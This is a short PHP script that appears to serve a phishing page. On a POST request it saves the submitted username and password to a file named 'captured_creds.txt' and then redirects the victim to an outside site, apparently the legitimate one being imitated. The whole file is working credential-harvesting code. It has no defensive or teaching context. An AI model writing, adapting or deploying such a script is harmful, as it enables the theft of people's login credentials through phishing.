<?php

// If this page was posted to.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  file_put_contents('captured_creds.txt', $_POST['username'] . ":" . $_POST['password']);
  header("Location: http://tantalumescrow.com/");
}
